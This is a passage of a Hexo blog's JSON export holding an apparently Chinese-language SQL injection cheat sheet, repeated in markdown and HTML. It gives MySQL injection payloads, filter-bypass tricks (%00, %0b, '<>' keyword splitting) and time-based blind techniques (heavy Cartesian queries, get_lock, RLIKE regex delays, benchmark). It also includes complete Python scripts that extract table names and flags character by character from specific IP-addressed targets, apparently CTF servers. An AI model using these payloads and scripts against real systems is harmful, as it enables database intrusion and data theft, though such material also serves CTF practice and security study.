try:\n            s = requests.get(url=payload_url,timeout=4.5)\n        except:\n            data +=chr(j)\n            print data\n            break\n```\n\n总结:\n\n必须使用长连接，即使用mysql_pconnect()\n\n构造被加锁的数据\n\n1.以客户A的身份,对资源skysec.top进行加锁 \n\n2.等待90s，让服务器将我们下一次的查询当做客户B \n\n3.利用客户B去尝试对资源skysec.top进行加锁，由于资源已被加锁，导致延时 \n\n## Rlike\n\n正则表达式\n\n```\nconcat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'\n```\n\n以上代码等同于sleep(5)\n\n ```\nmysql> select * from content where id =1 and IF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';\nEmpty set (4.24 sec)\n\nmysql> select * from content where id =1 and IF(0,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';\nEmpty set (0.00 sec)\n ```\n\n## sleep\n\n```\nmysql> select sleep(5);\n+----------+\n| sleep(5) |\n+----------+\n|        0 |\n+----------+\n1 row in set (5.00 sec)\n```\n\nBENCHMARK\n\n```\nmysql> select benchmark(10000000,sha(1));\n+----------------------------+\n| benchmark(10000000,sha(1)) |\n+----------------------------+\n|                          0 |\n+----------------------------+\n1 row in set (2.79 sec)\n```\n\n\n\n\n\n\n\n","source":"_posts/sql注入大全.md","raw":"---\ntitle: sql注入大全\ndate: 2018-03-21 09:26:16\ntags: \n- 安全\n- sql注入\ncategories: \n- 安全\n- sql注入\n---\n- 表名\n\n  ```mysql\n  select group_concat(distinct table_name) from information_schema.tables where table_schema=database()\n  ```\n\n\n- 列名\n\n  ```mysql\n  select group_concat(distinct column_name) from information_schema.columns where table_name=[16进制|`table_name`]\n  ```\n\n\n- 数据库\n\n  ```mysql\n  select group_concat(schema_name) from information_schema.schemata\n  ```\n\n- 表内容\n\n  ```mysql\n  select 1,concat(user, 0x2c, password) from [table_name]\n  ```\n\n  ​\n```\n优先级 运算符\n(最高)  !\n    -（负号）,~（按位取反）\n    ^（按位异或）\n    *,/(DIV),%(MOD)\n    +,-\n    >>,<<\n    &\n    |\n    =(比较运算),<=>,<,<=,>,>=,!=,<>,IN,IS NULL,LIKE,REGEXP\n   BETWEEN AND,CASE,WHEN,THEN,ELSE\n   NOT\n   &&,AND\n   XOR\n   ||,OR\n(最低)    =(赋值运算),:=\n```\n\n# union select 不允许同时出现\n过滤正则表达式如下:\n<code>\t\nunion[\\s\\xA0]+select\n</code><br/>\n可以使用union all select绕过\n\n# select过滤\nse%00lect绕过\n\n# -- 注释\n--后边不允许添加任何空白字符\n过滤正则表达式如下:\n--[\\s\\xA0]\n还可以使用%1a\n--%1a绕过\n\n# where后边跟着sleep函数\n`\nselect * from table_name where sleep(2) or 1 = 2;\n`\n\n如果1=2，则会等待（2*该表中的记录数）秒，没有数据返回\n如果1=1，则会立即返回所有数据\n\n@`'` 相当于 NULL\n\nselect group_concat(ip)'' from client_ip;\n\n# DNSlog盲注\nDNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like '%secure%';查看load_file()可以读取的磁盘。\n\n1、当secure_file_priv为空，就可以读取磁盘的目录。\n\n2、当secure_file_priv为G:\\，就可以读取G盘的文件。\n\n3、当secure_file_priv为null，load_file就不能加载文件。\n\n\nsleep 不能填数字，可以使用pi()替代\n\n各种payload:\n```\nselect * from antisqli where `id`='\\' and `pw`=md5(' union select 1,2,3--')\n```\n\n```\n644400 union select 'z1',flag,'z3','z4' from flag order by password desc#\n```\n\n关键词union,select,from被过滤，可以考虑%00绕过\n\n```\n//过滤sql\n$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');\nforeach ($array as $value)\n{\n\tif (substr_count($id, $value) > 0)\n\t{\n\t\texit('包含敏感关键字！'.$value);\n\t}\n}\n\n//xss过滤\n$id = strip_tags($id);\n\n$query = \"SELECT * FROM temp WHERE id={$id} LIMIT 1\";\npayload:\nhttp://103.238.227.13:10087/?id=2 unio%00n se%00lect hash,2 fro%00m sql3.key#\n由于strip_tags 将<>替换为空，所以可以使用<>绕过：\nhttp://103.238.227.13:10087/?id=2 unio<>n se<>lect hash,2 fro%00m sql3.key#\n```\n\n某些情况下SQL关键词被过滤掉并且被替换成空格。因此我们用“%0b”来绕过。\nid=1+uni%0bon+se%0blect+1,2,3--\n\n# Mysql大小写不敏感，绕过检测\n\n# heavy query       \n\n[链接](http://www.360zhijia.com/anquan/369098.html)\n\n## 笛卡尔积运算\n\n> select * from content where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C);\n\n```python\nimport requests\n\nurl = \"http://52.80.179.198:8080/article.php?id=1' and %s and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)%%23\"\ndata = \"\"\nfor i in range(1,1000):\n    for j in range(33,127):\n        #payload = \"(ascii(substr((database()),%s,1))=%s)\"%(i,j) #post\n        #payload = \"(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)\" % (i, j) #article,flags\n        #payload = \"(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='flags'),%s,1))=%s)\" % (i, j) #flag\n        payload = \"(ascii(substr((select flag from flags limit 1),%s,1))=%s)\" % (i, j)\n        payload_url = url%(payload)\n        try:\n            r = requests.get(url=payload_url,timeout=8)\n        except:\n            data +=chr(j)\n            print data\n            break\n```\n\n\n\n##  Get_lock\n\nget_lock是mysql的锁机制\n\n* get_lock会按照key来加锁，别的客户端再以同样的key加锁时就加不了了，处于等待状态。\n* 当调用release_lock来释放上面的锁或者客户端断线，上面的锁才释放，其他的客户端才能进来\n\n打开两个cmd\n\ncmd1:\n\n```\nmysql> select get_lock('skysec.top',1);\n+--------------------------+\n| get_lock('skysec.top',1) |\n+--------------------------+\n|                        1 |\n+--------------------------+\n1 row in set (0.00 sec)\n```\n\ncmd2:\n\n```\nmysql> select get_lock('skysec.top',5);\n+--------------------------+\n| get_lock('skysec.top',5) |\n+--------------------------+\n|                        0 |\n+--------------------------+\n1 row in set (5.00 sec)\n```\n\ncmd1:\n\n```\nmysql> select get_lock('skysec.top',2);\n+--------------------------+\n| get_lock('skysec.top',2) |\n+--------------------------+\n|                        0 |\n+--------------------------+\n1 row in set (2.00 sec)\n```\n\n关闭cmd1,cmd2执行：\n\n```\nmysql> select get_lock('skysec.top',5);\n+--------------------------+\n| get_lock('skysec.top',5) |\n+--------------------------+\n|                        1 |\n+--------------------------+\n1 row in set (0.00 sec)\n```\n\ncmd1关闭之后，锁自动释放，方案不是最佳，原因，该方法需要前提，长连接一般在php版本系列中，我们建立与Mysql的连接使用的是`mysql_connect`。\n\n```\nmysql_connect() 脚本一结束，到服务器的连接就被关闭\nmysql_pconnect() 打开一个到 MySQL 服务器的持久连接\n```\n\n官方描述：\n\n```\nmysql_pconnect() 和 mysql_connect() 非常相似，但有两个主要区别。\n首先，当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的（持久）连接，如果找到，则返回此连接标识而不打开新连接。\n其次，当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用（mysql_close() 不会关闭由 mysql_pconnect() 建立的连接）。\n简单来说，即\nmysql_connect()使用后立刻就会断开\n而\nmysql_pconnect()会保持连接，并不会立刻断开\n```\n\n所以:\n\n我们的时间盲注必须基于我们请求加锁的资源已经被其他客户端加锁过了 而mysql_connect()一结束，就会立刻关闭连接 这就意味着，我们刚刚对资源`skysec.top`加完锁就立刻断开了 而get_lock一旦断开连接，就会立刻释放资源 那么也就破坏了我们的前提：我们请求加锁的key已经被其他客户端加锁过了 所以如果使用了`mysql_connect()`，那么get_lock的方法将不适用 而`mysql_pconnect()`建立的却是长连接，我们的锁可以在一段有效的时间中一直加持在特定资源上 从而使我们可以满足大前提，而导致新的time injection手法 当然这里还有一个注意点 即第一次加锁后，需要等待1~2分钟，再访问的时候服务器就会判断你为客户B，而非之前加锁的客户A 此时即可触发get_lock 同样我们也本地测试一下，还是之前的cmd1和cmd2\n\n cmd1:\n\n```\nmysql> select * from content where id = 1 and get_lock('skysec.top',1);\n+----+-------------------------------------+\n| id | content                             |\n+----+-------------------------------------+\n|  1 | I think you may need sql injection! |\n+----+-------------------------------------+\n1 row in set (0.00 sec)\n```\n\ncmd2:\n\n```\nmysql> select * from content where id =1 and 1 and get_lock('skysec.top',5);\nEmpty set (5.00 sec)\n\nmysql> select * from content where id =1 and 0 and get_lock('skysec.top',5);\nEmpty set (0.00 sec)\n```\n\n脚本如下:\n\n```python\n# -*- coding: utf-8 -*-\nimport requests\nimport time\nurl1 = \"http://52.80.179.198:8080/article.php?id=1' and get_lock('skysec.top',1)%23\"\nr = requests.get(url=url1)\ntime.sleep(90)\n# 加锁后变换身份\nurl2 = \"http://52.80.179.198:8080/article.php?id=1' and %s and get_lock('skysec.top',5)%%23\"\ndata = \"\"\nfor i in range(1,1000):\n    print i\n    for j in range(33,127):\n        #payload = \"(ascii(substr((database()),%s,1))=%s)\"%(i,j) #post\n        payload = \"(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)\" % (i, j) #article,flags\n        #payload = \"(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='flags'),%s,1))=%s)\" % (i, j) #flag\n        #payload = \"(ascii(substr((select flag from flags limit 1),%s,1))=%s)\" % (i, j)\n        payload_url = url2%(payload)\n        try:\n            s = requests.get(url=payload_url,timeout=4.5)\n        except:\n            data +=chr(j)\n            print data\n            break\n```\n\n总结:\n\n必须使用长连接，即使用mysql_pconnect()\n\n构造被加锁的数据\n\n1.以客户A的身份,对资源skysec.top进行加锁 \n\n2.等待90s，让服务器将我们下一次的查询当做客户B \n\n3.利用客户B去尝试对资源skysec.top进行加锁，由于资源已被加锁，导致延时 \n\n## Rlike\n\n正则表达式\n\n```\nconcat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'\n```\n\n以上代码等同于sleep(5)\n\n ```\nmysql> select * from content where id =1 and IF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';\nEmpty set (4.24 sec)\n\nmysql> select * from content where id =1 and IF(0,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';\nEmpty set (0.00 sec)\n ```\n\n## sleep\n\n```\nmysql> select sleep(5);\n+----------+\n| sleep(5) |\n+----------+\n|        0 |\n+----------+\n1 row in set (5.00 sec)\n```\n\nBENCHMARK\n\n```\nmysql> select benchmark(10000000,sha(1));\n+----------------------------+\n| benchmark(10000000,sha(1)) |\n+----------------------------+\n|                          0 |\n+----------------------------+\n1 row in set (2.79 sec)\n```\n\n\n\n\n\n\n\n","slug":"sql注入大全","published":1,"updated":"2018-06-04T06:24:05.230Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jpv0010ly4jk6hx7zsw","content":"<ul>\n<li><p>表名</p>\n<pre><code class=\"mysql\">select group_concat(distinct table_name) from information_schema.tables where table_schema=database()\n</code></pre>\n</li>\n</ul>\n<ul>\n<li><p>列名</p>\n<pre><code class=\"mysql\">select group_concat(distinct column_name) from information_schema.columns where table_name=[16进制|`table_name`]\n</code></pre>\n</li>\n</ul>\n<ul>\n<li><p>数据库</p>\n<pre><code class=\"mysql\">select group_concat(schema_name) from information_schema.schemata\n</code></pre>\n</li>\n<li><p>表内容</p>\n<pre><code class=\"mysql\">select 1,concat(user, 0x2c, password) from [table_name]\n</code></pre>\n<p>​</p>\n<pre><code>优先级 运算符\n(最高)  !\n  -（负号）,~（按位取反）\n  ^（按位异或）\n  *,/(DIV),%(MOD)\n  +,-\n  &gt;&gt;,&lt;&lt;\n  &amp;\n  |\n  =(比较运算),&lt;=&gt;,&lt;,&lt;=,&gt;,&gt;=,!=,&lt;&gt;,IN,IS NULL,LIKE,REGEXP\n BETWEEN AND,CASE,WHEN,THEN,ELSE\n NOT\n &amp;&amp;,AND\n XOR\n ||,OR\n(最低)    =(赋值运算),:=\n</code></pre></li>\n</ul>\n<h1 id=\"union-select-不允许同时出现\"><a href=\"#union-select-不允许同时出现\" class=\"headerlink\" title=\"union select 不允许同时出现\"></a>union select 不允许同时出现</h1><p>过滤正则表达式如下:<br><code><br>union[\\s\\xA0]+select<br></code><br><br>可以使用union all select绕过</p>\n<h1 id=\"select过滤\"><a href=\"#select过滤\" class=\"headerlink\" title=\"select过滤\"></a>select过滤</h1><p>se%00lect绕过</p>\n<h1 id=\"–-注释\"><a href=\"#–-注释\" class=\"headerlink\" title=\"– 注释\"></a>– 注释</h1><p>–后边不允许添加任何空白字符<br>过滤正则表达式如下:<br>–[\\s\\xA0]<br>还可以使用%1a<br>–%1a绕过</p>\n<h1 id=\"where后边跟着sleep函数\"><a href=\"#where后边跟着sleep函数\" class=\"headerlink\" title=\"where后边跟着sleep函数\"></a>where后边跟着sleep函数</h1><p><code>select * from table_name where sleep(2) or 1 = 2;</code></p>\n<p>如果1=2，则会等待（2*该表中的记录数）秒，没有数据返回<br>如果1=1，则会立即返回所有数据</p>\n<p>@<code>&#39;</code> 相当于 NULL</p>\n<p>select group_concat(ip)’’ from client_ip;</p>\n<h1 id=\"DNSlog盲注\"><a href=\"#DNSlog盲注\" class=\"headerlink\" title=\"DNSlog盲注\"></a>DNSlog盲注</h1><p>DNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>\n<p>1、当secure_file_priv为空，就可以读取磁盘的目录。</p>\n<p>2、当secure_file_priv为G:\\，就可以读取G盘的文件。</p>\n<p>3、当secure_file_priv为null，load_file就不能加载文件。</p>\n<p>sleep 不能填数字，可以使用pi()替代</p>\n<p>各种payload:</p>\n<pre><code>select * from antisqli where `id`=&#39;\\&#39; and `pw`=md5(&#39; union select 1,2,3--&#39;)\n</code></pre><pre><code>644400 union select &#39;z1&#39;,flag,&#39;z3&#39;,&#39;z4&#39; from flag order by password desc#\n</code></pre><p>关键词union,select,from被过滤，可以考虑%00绕过</p>\n<pre><code>//过滤sql\n$array = array(&#39;table&#39;,&#39;union&#39;,&#39;and&#39;,&#39;or&#39;,&#39;load_file&#39;,&#39;create&#39;,&#39;delete&#39;,&#39;select&#39;,&#39;update&#39;,&#39;sleep&#39;,&#39;alter&#39;,&#39;drop&#39;,&#39;truncate&#39;,&#39;from&#39;,&#39;max&#39;,&#39;min&#39;,&#39;order&#39;,&#39;limit&#39;);\nforeach ($array as $value)\n{\n    if (substr_count($id, $value) &gt; 0)\n    {\n        exit(&#39;包含敏感关键字！&#39;.$value);\n    }\n}\n\n//xss过滤\n$id = strip_tags($id);\n\n$query = &quot;SELECT * FROM temp WHERE id={$id} LIMIT 1&quot;;\npayload:\nhttp://103.238.227.13:10087/?id=2 unio%00n se%00lect hash,2 fro%00m sql3.key#\n由于strip_tags 将&lt;&gt;替换为空，所以可以使用&lt;&gt;绕过：\nhttp://103.238.227.13:10087/?id=2 unio&lt;&gt;n se&lt;&gt;lect hash,2 fro%00m sql3.key#\n</code></pre><p>某些情况下SQL关键词被过滤掉并且被替换成空格。因此我们用“%0b”来绕过。<br>id=1+uni%0bon+se%0blect+1,2,3–</p>\n<h1 id=\"Mysql大小写不敏感，绕过检测\"><a href=\"#Mysql大小写不敏感，绕过检测\" class=\"headerlink\" title=\"Mysql大小写不敏感，绕过检测\"></a>Mysql大小写不敏感，绕过检测</h1><h1 id=\"heavy-query\"><a href=\"#heavy-query\" class=\"headerlink\" title=\"heavy query\"></a>heavy query</h1><p><a href=\"http://www.360zhijia.com/anquan/369098.html\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<h2 id=\"笛卡尔积运算\"><a href=\"#笛卡尔积运算\" class=\"headerlink\" title=\"笛卡尔积运算\"></a>笛卡尔积运算</h2><blockquote>\n<p>select <em> from content where id = 1 and 1 and (SELECT count(</em>) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C);</p>\n</blockquote>\n<pre><code class=\"python\">import requests\n\nurl = &quot;http://52.80.179.198:8080/article.php?id=1&#39; and %s and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)%%23&quot;\ndata = &quot;&quot;\nfor i in range(1,1000):\n    for j in range(33,127):\n        #payload = &quot;(ascii(substr((database()),%s,1))=%s)&quot;%(i,j) #post\n        #payload = &quot;(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)&quot; % (i, j) #article,flags\n        #payload = &quot;(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=&#39;flags&#39;),%s,1))=%s)&quot; % (i, j) #flag\n        payload = &quot;(ascii(substr((select flag from flags limit 1),%s,1))=%s)&quot; % (i, j)\n        payload_url = url%(payload)\n        try:\n            r = requests.get(url=payload_url,timeout=8)\n        except:\n            data +=chr(j)\n            print data\n            break\n</code></pre>\n<h2 id=\"Get-lock\"><a href=\"#Get-lock\" class=\"headerlink\" title=\"Get_lock\"></a>Get_lock</h2><p>get_lock是mysql的锁机制</p>\n<ul>\n<li>get_lock会按照key来加锁，别的客户端再以同样的key加锁时就加不了了，处于等待状态。</li>\n<li>当调用release_lock来释放上面的锁或者客户端断线，上面的锁才释放，其他的客户端才能进来</li>\n</ul>\n<p>打开两个cmd</p>\n<p>cmd1:</p>\n<pre><code>mysql&gt; select get_lock(&#39;skysec.top&#39;,1);\n+--------------------------+\n| get_lock(&#39;skysec.top&#39;,1) |\n+--------------------------+\n|                        1 |\n+--------------------------+\n1 row in set (0.00 sec)\n</code></pre><p>cmd2:</p>\n<pre><code>mysql&gt; select get_lock(&#39;skysec.top&#39;,5);\n+--------------------------+\n| get_lock(&#39;skysec.top&#39;,5) |\n+--------------------------+\n|                        0 |\n+--------------------------+\n1 row in set (5.00 sec)\n</code></pre><p>cmd1:</p>\n<pre><code>mysql&gt; select get_lock(&#39;skysec.top&#39;,2);\n+--------------------------+\n| get_lock(&#39;skysec.top&#39;,2) |\n+--------------------------+\n|                        0 |\n+--------------------------+\n1 row in set (2.00 sec)\n</code></pre><p>关闭cmd1,cmd2执行：</p>\n<pre><code>mysql&gt; select get_lock(&#39;skysec.top&#39;,5);\n+--------------------------+\n| get_lock(&#39;skysec.top&#39;,5) |\n+--------------------------+\n|                        1 |\n+--------------------------+\n1 row in set (0.00 sec)\n</code></pre><p>cmd1关闭之后，锁自动释放，方案不是最佳，原因，该方法需要前提，长连接一般在php版本系列中，我们建立与Mysql的连接使用的是<code>mysql_connect</code>。</p>\n<pre><code>mysql_connect() 脚本一结束，到服务器的连接就被关闭\nmysql_pconnect() 打开一个到 MySQL 服务器的持久连接\n</code></pre><p>官方描述：</p>\n<pre><code>mysql_pconnect() 和 mysql_connect() 非常相似，但有两个主要区别。\n首先，当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的（持久）连接，如果找到，则返回此连接标识而不打开新连接。\n其次，当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用（mysql_close() 不会关闭由 mysql_pconnect() 建立的连接）。\n简单来说，即\nmysql_connect()使用后立刻就会断开\n而\nmysql_pconnect()会保持连接，并不会立刻断开\n</code></pre><p>所以:</p>\n<p>我们的时间盲注必须基于我们请求加锁的资源已经被其他客户端加锁过了 而mysql_connect()一结束，就会立刻关闭连接 这就意味着，我们刚刚对资源<code>skysec.top</code>加完锁就立刻断开了 而get_lock一旦断开连接，就会立刻释放资源 那么也就破坏了我们的前提：我们请求加锁的key已经被其他客户端加锁过了 所以如果使用了<code>mysql_connect()</code>，那么get_lock的方法将不适用 而<code>mysql_pconnect()</code>建立的却是长连接，我们的锁可以在一段有效的时间中一直加持在特定资源上 从而使我们可以满足大前提，而导致新的time injection手法 当然这里还有一个注意点 即第一次加锁后，需要等待1~2分钟，再访问的时候服务器就会判断你为客户B，而非之前加锁的客户A 此时即可触发get_lock 同样我们也本地测试一下，还是之前的cmd1和cmd2</p>\n<p> cmd1:</p>\n<pre><code>mysql&gt; select * from content where id = 1 and get_lock(&#39;skysec.top&#39;,1);\n+----+-------------------------------------+\n| id | content                             |\n+----+-------------------------------------+\n|  1 | I think you may need sql injection! |\n+----+-------------------------------------+\n1 row in set (0.00 sec)\n</code></pre><p>cmd2:</p>\n<pre><code>mysql&gt; select * from content where id =1 and 1 and get_lock(&#39;skysec.top&#39;,5);\nEmpty set (5.00 sec)\n\nmysql&gt; select * from content where id =1 and 0 and get_lock(&#39;skysec.top&#39;,5);\nEmpty set (0.00 sec)\n</code></pre><p>脚本如下:</p>\n<pre><code class=\"python\"># -*- coding: utf-8 -*-\nimport requests\nimport time\nurl1 = &quot;http://52.80.179.198:8080/article.php?id=1&#39; and get_lock(&#39;skysec.top&#39;,1)%23&quot;\nr = requests.get(url=url1)\ntime.sleep(90)\n# 加锁后变换身份\nurl2 = &quot;http://52.80.179.198:8080/article.php?id=1&#39; and %s and get_lock(&#39;skysec.top&#39;,5)%%23&quot;\ndata = &quot;&quot;\nfor i in range(1,1000):\n    print i\n    for j in range(33,127):\n        #payload = &quot;(ascii(substr((database()),%s,1))=%s)&quot;%(i,j) #post\n        payload = &quot;(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)&quot; % (i, j) #article,flags\n        #payload = &quot;(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=&#39;flags&#39;),%s,1))=%s)&quot; % (i, j) #flag\n        #payload = &quot;(ascii(substr((select flag from flags limit 1),%s,1))=%s)&quot; % (i, j)\n        payload_url = url2%(payload)\n        try:\n            s = requests.get(url=payload_url,timeout=4.5)\n        except:\n            data +=chr(j)\n            print data\n            break\n</code></pre>\n<p>总结:</p>\n<p>必须使用长连接，即使用mysql_pconnect()</p>\n<p>构造被加锁的数据</p>\n<p>1.以客户A的身份,对资源skysec.top进行加锁 </p>\n<p>2.等待90s，让服务器将我们下一次的查询当做客户B </p>\n<p>3.利用客户B去尝试对资源skysec.top进行加锁，由于资源已被加锁，导致延时 </p>\n<h2 id=\"Rlike\"><a href=\"#Rlike\" class=\"headerlink\" title=\"Rlike\"></a>Rlike</h2><p>正则表达式</p>\n<pre><code>concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;\n</code></pre><p>以上代码等同于sleep(5)</p>\n<pre><code>mysql&gt; select * from content where id =1 and IF(1,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,0) and &#39;1&#39;=&#39;1&#39;;\nEmpty set (4.24 sec)\n\nmysql&gt; select * from content where id =1 and IF(0,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,0) and &#39;1&#39;=&#39;1&#39;;\nEmpty set (0.00 sec)\n</code></pre><h2 id=\"sleep\"><a href=\"#sleep\" class=\"headerlink\" title=\"sleep\"></a>sleep</h2><pre><code>mysql&gt; select sleep(5);\n+----------+\n| sleep(5) |\n+----------+\n|        0 |\n+----------+\n1 row in set (5.00 sec)\n</code></pre><p>BENCHMARK</p>\n<pre><code>mysql&gt; select benchmark(10000000,sha(1));\n+----------------------------+\n| benchmark(10000000,sha(1)) |\n+----------------------------+\n|                          0 |\n+----------------------------+\n1 row in set (2.79 sec)\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><p>表名</p>\n<pre><code class=\"mysql\">select group_concat(distinct table_name) from information_schema.tables where table_schema=database()\n</code></pre>\n</li>\n</ul>\n<ul>\n<li><p>列名</p>\n<pre><code class=\"mysql\">select group_concat(distinct column_name) from information_schema.columns where table_name=[16进制|`table_name`]\n</code></pre>\n</li>\n</ul>\n<ul>\n<li><p>数据库</p>\n<pre><code class=\"mysql\">select group_concat(schema_name) from information_schema.schemata\n</code></pre>\n</li>\n<li><p>表内容</p>\n<pre><code class=\"mysql\">select 1,concat(user, 0x2c, password) from [table_name]\n</code></pre>\n<p>​</p>\n<pre><code>优先级 运算符\n(最高)  !\n  -（负号）,~（按位取反）\n  ^（按位异或）\n  *,/(DIV),%(MOD)\n  +,-\n  &gt;&gt;,&lt;&lt;\n  &amp;\n  |\n  =(比较运算),&lt;=&gt;,&lt;,&lt;=,&gt;,&gt;=,!=,&lt;&gt;,IN,IS NULL,LIKE,REGEXP\n BETWEEN AND,CASE,WHEN,THEN,ELSE\n NOT\n &amp;&amp;,AND\n XOR\n ||,OR\n(最低)    =(赋值运算),:=\n</code></pre></li>\n</ul>\n<h1 id=\"union-select-不允许同时出现\"><a href=\"#union-select-不允许同时出现\" class=\"headerlink\" title=\"union select 不允许同时出现\"></a>union select 不允许同时出现</h1><p>过滤正则表达式如下:<br><code><br>union[\\s\\xA0]+select<br></code><br><br>可以使用union all select绕过</p>\n<h1 id=\"select过滤\"><a href=\"#select过滤\" class=\"headerlink\" title=\"select过滤\"></a>select过滤</h1><p>se%00lect绕过</p>\n<h1 id=\"–-注释\"><a href=\"#–-注释\" 